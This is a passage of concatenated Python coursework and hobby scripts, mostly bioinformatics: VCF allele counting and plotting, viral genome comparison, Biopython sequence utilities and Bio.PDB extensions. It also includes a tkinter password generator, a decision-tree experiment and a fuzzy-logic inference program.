        df[i] = [getAlleles(data_frame, snp_id), getSNPAllelesCount(data_frame, snp_id)]
    return df


""" 
    this function return the Alleles of specific ID if it return to the Reference or Alternative
        input:
            :param Data - pandas dataframe : vcf Data
            :param Data - str SNPid : SNP ID
        output:
            :return Alleles - list : list of all alleles as string
   """


def getAlleles(Data, SNPid):
    # get snp values
    snpvalues = getSNPvalues(Data, SNPid)
    # get snp reference
    snpref = getSNPRef(Data, SNPid)
    # get snp alternative
    snpalt = getSNPAlt(Data, SNPid)
    # join as string
    Alleles = " ".join(snpvalues[0])
    # replace 0 with reference
    Alleles = Alleles.replace("0", snpref)
    # replace 1 with alternative
    Alleles = Alleles.replace("1", snpalt)
    # remove / 
    Alleles = Alleles.replace("/", "")
    # replace .. with NA
    Alleles = Alleles.replace("..", "NA")
    # split to list
    Alleles = Alleles.split(" ")
    return Alleles


"""
    this function return the Alleles count for specific SNP ID
        input:
            :param Data - pandas dataframe : vcf Data
            :param Data - str SNPid : SNP ID
        output:
            :return AllelesCount - dictionary : dictionary of count of Alleles string of specific SNP ID  
   """


def getSNPAllelesCount(Data, SNPid):
    # get snp values
    Alleles = getAlleles(Data, SNPid)
    # count alleles
    AllelesCount = Counter(Alleles)

    return AllelesCount


"""
    this function return a plot for all chromosome simples count
        input:
            :param Data - pandas dataframe : vcf Data
        output:
            :return Plotting  - Plotting : return a plot for all chromosome simples count
   """


def plotForDataAlleles(Data):
    # da = getAllelesInDict(Data)
    #
    # df = pd.DataFrame.from_dict(da)
    # print(df)
    # ChrValues = {}
    # for ch in df.columns:
    #     values = {}
    #     thisChr = df[ch]
    #     thisChrValues = {}
    #     for v in thisChr:
    #         if v in thisChrValues:
    #             thisChrValues[v] += 1
    #         else:
    #             thisChrValues[v] = 1
    #     ChrValues[ch] = thisChrValues
    #
    # plotdata = pd.DataFrame(ChrValues)
    # plotdata = plotdata.transpose()
    # plotdata.plot(kind="bar", stacked=True)
    # plt.show()
    df = pd.DataFrame.from_dict(getDictInDataframe(Data))
    mycol = df.columns
    df = df.transpose()
    df['chrom'] = mycol
    df.plot(x='chrom', kind='bar', stacked=True, title='Stacked Bar Graph by dataframe')
    plt.show()

"""
    this function return a plot for all Data simples count
        input:
            :param Data - pandas dataframe : vcf Data
        output:
            :return Plotting  - Plotting : return a plot for all Data simples count
   """


def plotAllData(Data):
    da = getAllSNPAllelesCount(Data)
    df = pd.DataFrame.from_dict(da, orient='index').reset_index()
    df = df.rename(columns={'index': 'alleles', 0: 'count'})
    df.plot(x='alleles', kind="bar", stacked=True, title='All alleles data')
    plt.show()
from vcfHandel import *


class vcfIO:

    def __init__(self, vcf_file):
        self.Data = read_vcf(vcf_file)

    def print_header(self):
        # print pandas column names
        print(self.Data.columns.values)

    def return_sample_values(self, sample_name):
        return return_sample_values(self.Data, sample_name)

    '''input:
         :param samples - list : genotypes
       
       output:
         :return 
    '''
    def return_samples_values(self, samples):
        values = {}
        sn=0
        for sample in samples:
            if sample not in values.keys():
                values[sample]=[]
            values[sample].append(self.return_sample_values(sample))
            sn+=1
        return values



    def return_Chr_Values(self,Chr,Matrix=False):
        return return_Chr(self.Data,Chr,Matrix)

    def getSNPAlt(self,ID):
        return getSNPAlt(self.Data,ID)

    def getSNPRef(self,ID):
        return getSNPRef(self.Data,ID)

    def getSNPvalues(self,ID):
        return getSNPvalues(self.Data,ID)

    def getAlleles(self,ID):
        return getAlleles(self.Data,ID)

    def getSNPAllelesCount(self,ID):
        return getSNPAllelesCount(self.Data,ID)

    def getAllSNPAllelesCount(self):
        return getAllSNPAllelesCount(self.Data)

    def getAllelesInDataframe(self):
        return getDictInDataframe(self.Data)

    def getAllelesDict(self):
        return getAllelesInDict(self.Data)

    def AllDict(self):
        return makeDictForAll(self.Data)

    def plotingDict(self):
        return plotForDataAlleles(self.Data)
    def plotingAllData(self):
        return plotAllData(self.Data)
import pandas as pd
from matplotlib import pyplot as plt
from pandas.core.dtypes.generic import ABCSeries

import vcfIO

DataFile = "MP.vcf"
vcf = vcfIO.vcfIO(DataFile)
# print(vcf.Data)
# x=vcf.getAlt('snp15725-scaffold1652-760628')
# y=vcf.getReference('snp15725-scaffold1652-760628')
# z=vcf.getReference('snp15725-scaffold1652-760628')
# s=vcf.getChrSamples('NC_030808.1')
# print(vcf.return_sample_values("EY0050501"))
# print(vcf.return_Chr_Values(Chr="NC_030808.1",Matrix=True))
# print("================================================")
# print(vcf.getSNPAlt("snp15725-scaffold1652-760628"))
# print("================================================")
# print(vcf.getSNPRef("snp15725-scaffold1652-760628"))
# print("================================================")
# print(vcf.getSNPvalues("snp15725-scaffold1652-760628"))
# print("================================================")
# print(vcf.getSNPAllelesCount("snp15725-scaffold1652-760628"))
# print("================================================")
# print(vcf.getAllSNPAllelesCount())
# print("================================================")
# print(vcf.getAlleles('snp15725-scaffold1652-760628'))
# print(vcf.getAllelesDict())
# x=vcf.AllDict()
# print(x)
# print(vcf.getAllelesDict())
# print(x['NC_030808.1'])
# vcf.getAllelesInDataframe()
# vcf.plotingDict()


# df = pd.DataFrame.from_dict(vcf.getAllelesInDataframe())
# print(df)
# mycol= df.columns
# df = df.transpose()
# df['chrom']=mycol
# df.plot(x='chrom', kind='bar', stacked=True,title='Stacked Bar Graph by dataframe')
# plt.show()
vcf.plotingDict()

#
# vcf.plotingAllData()
# vcf.plotingDict()

# print(da)
# vcf.plotingDict()
#
#
# mychromsomes = df.columns
# df = df.transpose()
# df['chrom']=mychromsomes
#

# # slice df
# df_sample = df.head()
# print(df_sample)
# # df_sample.plot()
# # plt.show()
# plotdata = pd.DataFrame({"ages": [65, 61, 25, 22, 27]})
# # plotdata.plot(kind="bar")
# # plt.show()
# print(plotdata)
# #
# data=vcf.getAllelesInDataframe()
# df=pd.DataFrame.from_dict(data)
# mychrom = df.columns
#
# df = df.transpose()
# df['chrom']= mychrom
# print(df)
# df.plot(x=df['chrom'], kind='bar', stacked=True,title='Stacked Bar Graph by dataframe')
# plt.show()

# MRIDULA SHAN - COVID19 GLOBAL HACKATHON APPLICATION
# Calculates the Mutation Rate between two different genomic sequences
def MutationRate(positions, genome1, genome2):
    mutationrate = 0
    if len(genome1) == len(genome2):
        mutationrate = len(positions) / (2 * len(genome1))
    if len(genome1) > len(genome2):
        mutationrate = len(positions) / len(genome2)
    if len(genome1) < len(genome2):
        mutationrate = len(positions) / len(genome1)
    return mutationrate

#Iterates through a genomic sequence and returns the indexes where differences occur
def Comparison(genome1, genome2):
    positions = []
    if (len(genome1) == len(genome2)):
        for i in range(len(genome1)):
            if genome1[i] != genome2[i]:
                positions.append(i)
        return positions

    if (len(genome1) > len(genome2)):
        for i in range(len(genome2)):
            if genome1[i] != genome2[i]:
                positions.append(i)
        if len(positions) == 0:
            positions.append(len(genome1) - 1)
        return positions
    if (len(genome1) < len(genome2)):
        for i in range(len(genome1)):
            if (genome1[i] != genome2[i]):
                positions.append(i)
        if len(positions) == 0:
            positions.append(len(genome2) - 1)
        return positions

# Opens up  all eleven files of the genetic sequences for each virus type and saves to variable
file1 = open('New folder (4)/Wuhan.txt')
for char in file1:
    genome1 = char

file2 = open('New folder (4)/italy.txt')
for char in file2:
    genome2 = char

file3 = open('New folder (4)/US.txt')
for char in file3:
    genome3 = char

file4 = open('New folder (4)/India.txt')
for char in file4:
    genome4 = char

file5 = open('New folder (4)/brazil.txt')
for char in file5:
    genome5 = char


file6 = open('New folder (4)/astrulia.txt')
for char in file6:
    genome7 = char

file7 = open('New folder (4)/japan.txt')
for char in file7:
    genome8 = char

file8 = open('New folder (4)/nepal.txt')
for char in file8:
    genome9 = char

file9 = open('New folder (4)/Sweden.txt')
for char in file9:
    genome10 = char

file10 = open('New folder (4)/Taiwan.txt')
for char in file10:
    genome11 = char

#Below prints out all the combinations for the 11 different viruses
#Calls each function for every combination
# -------------- 1)WUHAN VIRUS---------------------------
# Italy
print("Wuhan & Italy")
positions = Comparison((genome1), (genome2))
print(positions)
mutationrate = MutationRate(positions, genome1, genome2)
print(mutationrate)

# xpdb.py -- extensions to Bio.PDB
# (c) 2009 Oliver Beckstein
# Relased under the same license as Biopython.
# See http://biopython.org/wiki/Reading_large_PDB_files

import sys
import Bio.PDB
import Bio.PDB.StructureBuilder
from Bio.PDB.Residue import Residue


class SloppyStructureBuilder(Bio.PDB.StructureBuilder.StructureBuilder):
    """Cope with resSeq < 10,000 limitation by just incrementing internally.

    # Q: What's wrong here??
    #   Some atoms or residues will be missing in the data structure.
    #   WARNING: Residue (' ', 8954, ' ') redefined at line 74803.
    #   PDBConstructionException: Blank altlocs in duplicate residue SOL
    #   (' ', 8954, ' ') at line 74803.
    #
    # A: resSeq only goes to 9999 --> goes back to 0 (PDB format is not really
    #    good here)
    """

    # NOTE/TODO:
    # - H and W records are probably not handled yet (don't have examples
    #   to test)

    def __init__(self, verbose=False):
        Bio.PDB.StructureBuilder.StructureBuilder.__init__(self)
        self.max_resseq = -1
        self.verbose = verbose

    def init_residue(self, resname, field, resseq, icode):
        """Initiate a new Residue object.

        Arguments:
        o resname - string, e.g. "ASN"
        o field - hetero flag, "W" for waters, "H" for
            hetero residues, otherwise blanc.
        o resseq - int, sequence identifier
        o icode - string, insertion code

        """
        if field != " ":
            if field == "H":
                # The hetero field consists of
                # H_ + the residue name (e.g. H_FUC)
                field = "H_" + resname
        res_id = (field, resseq, icode)

        if resseq > self.max_resseq:
            self.max_resseq = resseq

        if field == " ":
            fudged_resseq = False
            while self.chain.has_id(res_id) or resseq == 0:
                # There already is a residue with the id (field, resseq, icode)
                # resseq == 0 catches already wrapped residue numbers which
                # do not trigger the has_id() test.
                #
                # Be sloppy and just increment...
                # (This code will not leave gaps in resids... I think)
                #
                # XXX: shouldn't we also do this for hetero atoms and water??
                self.max_resseq += 1
                resseq = self.max_resseq
                res_id = (field, resseq, icode)  # use max_resseq!
                fudged_resseq = True

            if fudged_resseq and self.verbose:
                sys.stderr.write(
                    "Residues are wrapping (Residue "
                    + "('%s', %i, '%s') at line %i)."
                    % (field, resseq, icode, self.line_counter)
                    + ".... assigning new resid %d.\n" % self.max_resseq
                )
        residue = Residue(res_id, resname, self.segid)
        self.chain.add(residue)
        self.residue = residue


class SloppyPDBIO(Bio.PDB.PDBIO):
    """PDBIO class that can deal with large pdb files as used in MD simulations

    - resSeq simply wrap and are printed modulo 10,000.
    - atom numbers wrap at 99,999 and are printed modulo 100,000

    """

    # The format string is derived from the PDB format as used in PDBIO.py
    # (has to be copied to the class because of the package layout it is not
    # externally accessible)
    _ATOM_FORMAT_STRING = (
        "%s%5i %-4s%c%3s %c%4i%c   " + "%8.3f%8.3f%8.3f%6.2f%6.2f      %4s%2s%2s\n"
    )

    def _get_atom_line(
        self,
        atom,
        hetfield,
        segid,
        atom_number,
        resname,
        resseq,
        icode,
        chain_id,
        element="  ",
        charge="  ",
    ):
        """Returns an ATOM string that is guaranteed to fit the ATOM format.

        - Resid (resseq) is wrapped (modulo 10,000) to fit into %4i (4I) format
        - Atom number (atom_number) is wrapped (modulo 100,000) to fit into
          %5i (5I) format

        """
        if hetfield != " ":
            record_type = "HETATM"
        else:
            record_type = "ATOM  "
        name = atom.get_fullname()
        altloc = atom.get_altloc()
        x, y, z = atom.get_coord()
        bfactor = atom.get_bfactor()
        occupancy = atom.get_occupancy()
        args = (
            record_type,
            atom_number % 100000,
            name,
            altloc,
            resname,
            chain_id,
            resseq % 10000,
            icode,
            x,
            y,
            z,
            occupancy,
            bfactor,
            segid,
            element,
            charge,
        )
        return self._ATOM_FORMAT_STRING % args


# convenience functions

sloppyparser = Bio.PDB.PDBParser(
    PERMISSIVE=True, structure_builder=SloppyStructureBuilder()
)


def get_structure(pdbfile, pdbid="system"):
    return sloppyparser.get_structure(pdbid, pdbfile)

# import files
# def seq_alignment_files(File1Path, File2Path, OutputPath):
#     sequance1 = ''
#     sequance2 = ''
#     file1 = open(File1Path, "r")
#     for line in file1:
#         line = line.rstrip()  # this discard the newline at the end (if any)
#         if line[0] == '>':  # if file is fasta
#             sequance1 = line[1:]
#         else:
#             sequance1 = line[0:]
#     file1.close()
#     file2 = open(File2Path, "r")
#     for line in file2:
#         line = line.rstrip()  # this discard the newline at the end (if any)
#         if line[0] == '>':  # if file is fasta
#             sequance2 = line[1:]
#         else:
#             sequance2 = line[0:]
#     file2.close()
#     if len(OutputPath) == 0:
#         for alignment in pairwise2.align.globalxx(sequance1, sequance2):
#             print(pairwise2.format_alignment(*alignment))
#     else:
#         f = open(OutputPath, 'a')
#         for alignment in pairwise2.align.globalxx(sequance1, sequance2):
#             f.write(pairwise2.format_alignment(*alignment))
#         f.close()
#

#
# elif args[0] == 'seq_alignment_files':  # seq_alignment_files
# if len(i) != 0:
#     print(f'seq_alignment_files_Done: {mybio.alignment_files(args[1], args[2], i)}')
# else:
#     print('option should be like "output.txt"')
#
# elif args[0] == 'online_alignment':  # online_alignment
# if len(i) != 0:
#     print(f'online alignment Done: {mybio.online(args[1], i)}')
# else:
#     print('option should be like "output.txt"')
#
# elif args[0] == 'merge_fasta':  # merge_fasta
# if len(i) != 0:
#     print(mybio.mergation(path='', *args[1:]))
# else:
#     print('option should be like "output.txt"')
import random
import array
import tkinter
from tkinter import *


win = Tk()
win.geometry("700x350")




def generator():
    """
        maximum length of password needed
        this can be changed to suit your password length
    """
    MAX_LEN =   int(a.get())

    """
     declare arrays of the character that we need in out password
     Represented as chars to enable easy string concatenation
    """
    DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    LOCASE_CHARACTERS = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
                         'u', 'v', 'w', 'x', 'y', 'z']

    UPCASE_CHARACTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
                         'U', 'V', 'W', 'X', 'Y', 'Z']

    SYMBOLS = ['@', '#', '$', '%', '=', ':', '?', '.', '/', '|', '~', '>', '*', '(', ')', '<']

    ''' combines all the character arrays above to form one array '''
    COMBINED_LIST = DIGITS + UPCASE_CHARACTERS + LOCASE_CHARACTERS + SYMBOLS

    ''' randomly select at least one character from each character set above'''
    rand_digit = random.choice(DIGITS)
    rand_upper = random.choice(UPCASE_CHARACTERS)
    rand_lower = random.choice(LOCASE_CHARACTERS)
    rand_symbol = random.choice(SYMBOLS)

    """
         combine the character randomly selected above
         at this stage, the password contains only 4 characters but
         we want a 12-character password
    """
    temp_pass = rand_digit + rand_upper + rand_lower + rand_symbol

    """ 
        now that we are sure we have at least one character from each
        set of characters, we fill the rest with
        the password length by selecting randomly from the combined
        list of character above.
     """
    temp_pass_list = list()
    for x in range(MAX_LEN - 4):
        temp_pass = temp_pass + random.choice(COMBINED_LIST)

        """ 
            convert temporary password into array and shuffle to
            prevent it from having a consistent pattern
            where the beginning of the password is predictable
        """
        temp_pass_list = array.array('u', temp_pass)
        random.shuffle(temp_pass_list)
    return temp_pass_list

def run():
    """
         traverse the temporary password array and append the chars
         to form the password
        """
    password = ""

    temp_pass_list = generator()

    for x in temp_pass_list:
        password = password + x
    l2.config(text=password)

Label(win,text="Enter you password size",font=('Calibri 10')).pack()
a=Entry(win,width=35)
a.pack()

l2=Label(win,text="Your New Password",font=('Calibri 10'))
l2.pack(pady=20)
Button(win,text="Generate password",command=run).pack()
win.mainloop()



from collections import OrderedDict
import gzip
import pandas as pd


VCF_HEADER = ['CHROM', 'POS', 'ID', 'REF', 'ALT', 'QUAL', 'FILTER', 'INFO']


def dataframe(filename, large=True):
    """Open an optionally gzipped VCF file and return a pandas.DataFrame with
    each INFO field included as a column in the dataframe.
    Note: Using large=False with large VCF files. It will be painfully slow.
    param filename:    An optionally gzipped VCF file.
    param large:       Use this with large VCF files to skip the ## lines and
                        leave the INFO fields unseparated as a single column.
    """
    if large:
        # Set the proper argument if the file is compressed.
        comp = 'gzip' if filename.endswith('.gz') else None
        # Count how many comment lines should be skipped.
        comments = _count_comments(filename)
        # Return a simple DataFrame without splitting the INFO column.
        return pd.read_table(filename, compression=comp, skiprows=comments,
                             names=VCF_HEADER, usecols=range(8))

    # Each column is a list stored as a value in this dict. The keys for this
    # dict are the VCF column names and the keys in the INFO column.
    result = OrderedDict()
    # Parse each line in the VCF file into a dict.
    for i, line in enumerate(lines(filename)):
        for key in line.keys():
            # This key has not been seen yet, so set it to None for all
            # previous lines.
            if key not in result:
                result[key] = [None] * i
        # Ensure this row has some value for each column.
        for key in result.keys():
            result[key].append(line.get(key, None))

    return pd.DataFrame(result)


def lines(filename):
    """Open an optionally gzipped VCF file and generate an OrderedDict for
    each line.
    """
    fn_open = gzip.open if filename.endswith('.gz') else open

    with fn_open(filename) as fh:
        for line in fh:
            if line.startswith('#'):
                continue
            else:
                yield parse(line)


def parse(line):
    """Parse a single VCF line and return an OrderedDict.
    """
    result = OrderedDict()

    fields = line.rstrip().split('\t')

    # Read the values in the first seven columns.
    for i, col in enumerate(VCF_HEADER[:7]):
        result[col] = _get_value(fields[i])

    # INFO field consists of "key1=value;key2=value;...".
    infos = fields[7].split(';')

    for i, info in enumerate(infos, 1):
        # info should be "key=value".
        try:
            key, value = info.split('=')
        # But sometimes it is just "value", so we'll make our own key.
        except ValueError:
            key = 'INFO{}'.format(i)
            value = info
        # Set the value to None if there is no value.
        result[key] = _get_value(value)

    return result


def _get_value(value):
    """Interpret null values and return ``None``. Return a list if the value
    contains a comma.
    """
    if not value or value in ['', '.', 'NA']:
        return None
    if ',' in value:
        return value.split(',')
    return value


def _count_comments(filename):
    """Count comment lines (those that start with "#") in an optionally
    gzipped file.
    param filename:  An optionally gzipped file.
    """
    comments = 0
    fn_open = gzip.open if filename.endswith('.gz') else open
    with fn_open(filename) as fh:
        for line in fh:
            if line.startswith('#'):
                comments += 1
            else:
                break
    return comments


z=dataframe('MP.vcf')
print(z)
from functionsBio import bioFun
import functionsRun

opt,args = functionsRun.fillingOptsArgs()
mybio = bioFun(args[1])
functionsRun.runArgs(mybio,args,opt)

# python assBioPython dna AGCTGACTGACTACGTCGAGTCGTACGCA

import pandas as pn
from sklearn import preprocessing
import matplotlib as plt
from sklearn import tree
import statistics
import random

house_votes = pn.read_csv(r"E:\Bioninformatics\year4,sem1\Machine Learning and Bioinformatics\Assignments\house-votes-84.data", header=None)
copy = house_votes
outputY = house_votes[0]

features = copy.drop(columns=copy.columns[0])

modeCol = features.mode()
modeColStr = str(modeCol)
modeColSplit = modeColStr.split()
st = int(len(modeColSplit)/2)+1
modeLast = modeColSplit[st:]

# print(modeCol, "\n", modeColStr, "\n", modeColSplit, "\n", modeLast)
i = 0

process = preprocessing.LabelEncoder()
outProcess = preprocessing.LabelEncoder()
for x in features:
    features[x] = features[x].replace({"?": modeLast[i]})
    process.fit(features[x])
    features[x] = process.transform(features[x])
    i = i + 1

outProcess.fit(outputY)
outputY = outProcess.transform(outputY)

dt = tree.DecisionTreeClassifier()

rangeList = [30, 40, 50, 60, 70, 80]
accuracy = []
sizList = []

accuracyX = []
sizListX = []
accuracyt = []
splits = []
# Random 25% splits
for x in range(3):
    counterX = 0
    split = random.randint(1, int(len(features) - (len(features) * 0.25)))
    siz = int(split + len(features) * 0.25)
    # print(split, siz, len(outputY))
    dt = dt.fit(features[split:siz], outputY[split:siz])
    outA = dt.predict(features[siz:])
    outB = dt.predict(features[:split])
    for x in range(len(outputY[siz:])):
        if siz == len(outputY) - 1:
            # print("BROKE")
            break
        elif outA[x] == outputY[siz:][x]:
            counterX += 1
    for x in range(len(outputY[:split])):
        if split == 0:
            # print("0, break")
            break
        if outB[x] == outputY[:split][x]:
            counterX += 1
    accuracyX.append((counterX / (len(outputY[siz:]) + len(outputY[:split])) * 100))
    nodeSize = dt.tree_.node_count
    sizListX.append(nodeSize)

print("Accuracy of random 25% splitting: ", accuracyX)
print("Tree Size of random 25% splitting: ", sizListX)

accStat = []
sizeStat = []
for i in rangeList:
    sizListt = []
    accuracyt = []
    spli = []
    for x in range(5):
        counter = 0
        split1 = random.randint(1, int(len(features) - (len(features) * (i / 100))))
        siz2 = int(split1 + (len(features) * (i / 100)))
        dt = dt.fit(features[:siz2], outputY[:siz2])
        outA = dt.predict(features[siz2:])
        for x in range(len(outputY[siz2:])):
            if outA[x] == outputY[siz2:][x]:
                counter += 1
        accuracyt.append((counter / len(outputY[siz2:])) * 100)
        siz = dt.tree_.node_count
        sizListt.append(siz)
        spli.append(siz2)
    accStat.append(statistics.mean(accuracyt))
    accStat.append(max(accuracyt))
    accStat.append(min(accuracyt))

    sizeStat.append(statistics.mean(sizListt))
    sizeStat.append(max(sizListt))
    sizeStat.append(min(sizListt))

    accuracy.append(max(accuracyt))
    ind = accuracyt.index(max(accuracyt))
    sizList.append(sizListt[ind])
    splits.append(spli[ind])

j = 0
for i in range(0, len(accStat), 3):
    print("Mean of the tree size with different train sizes: ", sizeStat[i])
    print("Min size of the nodes in the tree with different train sizes: ", sizeStat[i+1])
    print("Max size of the nodes in the tree with different train sizes: ", sizeStat[i+2])
    print("Mean of Accuracies with random splits of size ", rangeList[j], ":", accStat[i])
    print("Max of Accuracies with random splits of size ", rangeList[j], ":", accStat[i+1])
    print("Min of Accuracies with random splits of size ", rangeList[j], ":", accStat[i+2], "\n")
    j += 1

index = accuracy.index(max(accuracy))
dt = dt.fit(features[:splits[index]], outputY[:splits[index]])
outA = dt.predict(features[splits[index]:])

plt.pyplot.plot(rangeList, sizList, color='black', linewidth=1, marker='o', markerfacecolor='pink', markersize=8)
plt.pyplot.show()

plt.pyplot.plot(rangeList, accuracy, color='black', linewidth=1, marker='o', markerfacecolor='purple', markersize=8)
plt.pyplot.show()

tree.plot_tree(dt, filled=True)
# fig = plt.pyplot.figure(figsize=(25, 20))
plt.pyplot.show()

from Bio.Seq import Seq
from Bio.SeqUtils import GC
from Bio import pairwise2



# python <dir>\assBioPython.py filter_nbases AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGNNNCA
# AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGCA
def Filter(dna):
    d = Seq(dna)
    FN = d.replace('N', '')
    return FN


# python <dir>\assBioPython.py calc_nbases AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGNNNCA
# 3
def nbases(dna):
    d = Seq(dna)
    nbases = d.count('N')
    return nbases


# python <dir>\assBioPython.py reverse_complement AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGNNNCA
def Revcomp(dna):
    d = Seq(dna)
    RC = d.reverse_complement()
    return RC


# python <dir>\assBioPython.py gc AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGNNNCA
# G count C count / len(seq) *
def gcpercentage(dna):
    z = GC(dna)
    return z


# python <dir>\assBioPython.py transcribe AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGNNNCA
def Transcribe(dna):
    d = Seq(dna)
    transcribe = d.transcribe()
    return transcribe


# python <dir>\assBioPython.py is_valid AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGCA dna
def valid(seq, typee):
    d = 'ACGT'
    rna = 'ACGU'
    protein = 'ABCDEFGHIKLMNPQRSTVWXYZabcdefghiklmnpqrstvwxyz'
    valid = True
    if typee == 'DNA' or typee == 'dna':
        for base in seq:
            if base not in d:
                valid = False
        return valid
    elif typee == 'RNA' or typee == 'rna':
        for base in seq:
            if base not in rna:
                valid = False
        return valid
    elif typee == 'PROTEIN' or typee == 'protein':
        for base in seq:
            if base not in protein:
                valid = False
        return valid
    print('The type incorrect')

# AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGCA
# AGCTGACTGACTACGTCGAGTCTA
# there is output file have the alll alignments
# python <dir>assBioPython.py seq_alignment AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGCA AGCTGACTGACTACGTCGAGTCTA -o output.txt
def seq_alignment(seq1, seq2, file_name=None):
    alignments = pairwise2.align.globalxx(seq1, seq2)
    if file_name == None:
        for alignment in alignments:
            print(pairwise2.format_alignment(*alignment))
    else:
        f = open(file_name, 'a')
        for alignment in alignments:
            f.write(pairwise2.format_alignment(*alignment))
        f.close()

import tkinter
from tkinter import *
from tkinter import ttk, filedialog

# Create an instance of tkinter frame
win = Tk()
# Set the geometry of tkinter frame
win.geometry("700x350")


def run():
    # Add a Label widget
    label = Label(win, text="Click the Button to browse the Files", font=('Georgia 13'))
    label.pack(pady=10)
    b = StringVar()

    # Create a Button
    z = ttk.Button(win, text="Browse", command=open_file).pack(pady=20)

    win.mainloop()

fileName=''
def open_file(event=None):
    global fileName
    fileName = filedialog.askopenfile(filetypes=[('TEXT Files', '*.txt')])
    win.quit()


# ============================= Classes =============================
class Set:
    def __init__(self, name, typ, xs):
        self.name = name
        self.type = typ
        self.xs = xs
        self.ms = None


class Variable:
    def __init__(self, name: str, sets=[], value=None):
        self.name = name
        self.sets = sets
        self.value = value
        self.bestSet = None


# ============================= Read File =============================



run()
inputFile = fileName

inVars = []
inVarsNumber = int(inputFile.readline())
for i in range(inVarsNumber):
    var = inputFile.readline().split(' ')
    varName = var[0]
    value = int(var[1])
    var = Variable(varName, [], value)
    inVars.append(var)

outVars = []
outVarsNumber = int(inputFile.readline())
for i in range(outVarsNumber):
    varName = inputFile.readline().strip('\n')
    var = Variable(varName, [], None)
    outVars.append(var)


for i in range(inVarsNumber):
    sets = []
    for j in range(int(inputFile.readline())):
        set = inputFile.readline().split(' ')
        setName = set[0]
        setType = set[1]
        setXs = []
        for x in set[2:]:
            setXs.append(int(x))
        set = Set(setName, setType, setXs)
        sets.append(set)
        sorted(setXs)
    inVars[i].sets=sets

for i in range(outVarsNumber):
    sets = []
    for j in range(int(inputFile.readline())):
        set = inputFile.readline().split(' ')
        setName = set[0]
        setType = set[1]
        setXs = []
        for x in set[2:]:
            setXs.append(int(x))
        set = Set(setName, setType, setXs)
        sets.append(set)
        sorted(setXs)
    outVars[i].sets=sets

rulesNumber = int(inputFile.readline())
rules = []
for i in range(rulesNumber):
    rules.append(inputFile.readline().strip('\n'))


# ============================= Fuzzification =============================
for var in inVars:
    for set in var.sets:
        if var.value < set.xs[0]:
            set.ms = 0
        elif var.value > set.xs[len(set.xs) - 1]:
            set.ms = 0
        else:
            for i in range(len(set.xs)):
                if var.value == set.xs[i]:
                    set.ms = 0 if i == 0 or i == len(set.xs)-1 else 1

                elif i < len(set.xs) - 1 and set.xs[i] < var.value and var.value < set.xs[i + 1]:
                    y1 = 0 if i == 0 or i == len(set.xs)-1 else 1
                    y2 = 0 if i+1 == 0 or i+1 == len(set.xs)-1 else 1
                    x1 = set.xs[i]
                    x2 = set.xs[i+1]

                    m = (y2 - y1) / (x2 - x1)
                    c = y1 - m * x1
                    set.ms = m * var.value + c


# ============================= Inference =============================
def searName(vars, name):
    for var in vars:
        if name == var.name:
            return var
    return False

def Operator(strings):
    newArr=[]
    for i in range(len(strings)):
        try:
            if strings[i] == 'not':
                x = 1 - float(strings[i + 1])
                strings[i + 1] = x
                strings.remove(strings[i])
                newArr.append(strings[i])
            else:
                newArr.append(strings[i])
        except (IndexError):
            break
    strings=newArr
    for i in range(len(strings)):
        try:
            if strings[i]=='and':
                x=float(strings[i-1])
                y=float(strings[i+1])
                z=min(x,y)
                strings[i]=z
                strings.remove(strings[i+1])
                strings.remove(strings[i-1])
            else:
               newArr=strings
        except(IndexError):
            break
    strings=newArr
    for i in range(len(strings)):
        try:
            if strings[i]=='or':
                x=float(strings[i-1])
                y=float(strings[i+1])
                z=max(x,y)
                strings[i]=z
                strings.remove(strings[i+1])
                strings.remove(strings[i-1])
            else:
               newArr=strings
        except(IndexError):
            break
    return newArr[0]

for rule in rules:
    rule = rule.lower()
    operation, output = rule.split(' => ')
    operation = operation.split(' ')
    newOperation = []
    skip = False
    for i in range(len(operation)):
        if skip:
            skip = False
            continue

        var = searName(inVars, operation[i])
        if var:
            set = searName(var.sets, operation[i+1])
            newOperation.append(str(set.ms))
            skip = True
        else:
            newOperation.append(operation[i])
    var = searName(outVars, output.split(' ')[0])
    set = searName(var.sets, output.split(' ')[1])
    newMs = Operator(newOperation)
    if not set.ms or newMs > set.ms: 
        set.ms = newMs


# ============================= Defuzzification =============================
#sum(centorid*membership[i])/len(membership->crsb value)
for var in outVars:
    msXcenterSum = 0
    msSum = 0
    bestMS = 0
    bestSet = var.sets[0].name
    for set in var.sets:
        center = sum(set.xs)/len(set.xs)
        msXcenterSum += float(float(set.ms)*center)
        msSum += float(set.ms)

        if float(set.ms) > bestMS:
            bestMS = set.ms
            bestSet = set.name
    var.value = msXcenterSum / msSum
    var.bestSet = bestSet




# ============================= Output File =============================
file = open('o.txt', 'w')
for outVar in outVars:
    file.write(outVar.name)
    file.write(' -> ')
    file.write(outVar.bestSet)
    file.write(' (')
    file.write(str(outVar.value))
    file.write(')\n')
file.close()
print('Done. wrote to out.txt')



# input file structure
"""
2
var-in-name 2
var-in-name 2
2
var-out-name
var-out-name
3
var-one-set set-type set-xs
var-one-set set-type set-xs
var-one-set set-type set-xs
3
var-two-set set-type set-xs
var-two-set set-type set-xs
var-two-set set-type set-xs
2
var-one-out-set set-type set-xs
var-one-out-set set-type set-xs
1
var-two-out-set set-type set-xs
4
rule
rule
rule
rule
"""
# from pydna.dseq import Dseq
# import pydna
# import bamnostic
#
#
#
# seq = Dseq("GGATCCAAA","TTTGGATCC",ovhg=0)
#
# from Bio.Restriction import PrintFormat


import Bio
from Bio import SeqRecord
from Bio import SeqIO
from Bio.Seq import Seq
sequance=list(SeqIO.parse("ls_orchid.fasta","fasta"))

print(sequance[0])
# import pandas as pd
# import io
# import os
#
#
# def readingFile(path):
#     with open(path,'r') as f:
